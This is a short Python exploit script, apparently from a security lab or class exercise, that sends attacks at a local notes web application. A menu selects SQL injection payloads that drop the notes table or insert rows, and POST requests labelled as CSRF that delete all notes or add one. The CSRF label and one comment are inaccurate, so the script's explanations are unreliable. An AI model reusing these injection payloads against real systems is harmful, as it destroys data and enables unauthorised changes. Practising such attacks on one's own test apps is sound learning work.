# Exploit Script for AAF-Internal-Notes-System
# Requests package is required - run "pip install requests" if the script does not work.

import requests

exploit_code = input("""
Please input which exploit you'd like to use:

1) SQL Injection (Action: Delete all notes)
2) SQL Injection (Action: Insert note)
3) Cross-Site Request Forgery (Action: Delete all notes)
4) Cross-Site Request Forgery (Action: Insert Note)

""")

url = 'http://127.0.0.1:8080/' # Sets the URL to target

match exploit_code:
    case "1": # If SQL Injection is selected
        print("Running SQL Injection attack.")
        form_data = {'note': '"); DROP TABLE notes;'} # Build malicious note containing SQL payload to drop the notes table
        requests.post(url, data=form_data) # Submit request to server
    case "2": # If SQL Injection is selected
        print("Running SQL Injection attack.")
        form_data = {'note': '"); INSERT INTO notes VALUES ("ayayayayayayaya'} # Build malicious note containing SQL payload to drop the notes table
        requests.post(url, data=form_data) # Submit request to server
    case "3": # If CRSF is selected
        print("Running CRSF attack.")
        form_data = {'note':'gandalf', 'id': -1} # Creates a dummy note request with an id of -1, which will instruct it to delete all notes
        server = requests.post(url, data=form_data) # Submit request to server
    case "4": # If CRSF is selected
        print("Running CRSF attack.")
        form_data = {'note':'gandalf'} # Creates a note request containing "gandalf"
        server = requests.post(url, data=form_data) # Submit request to server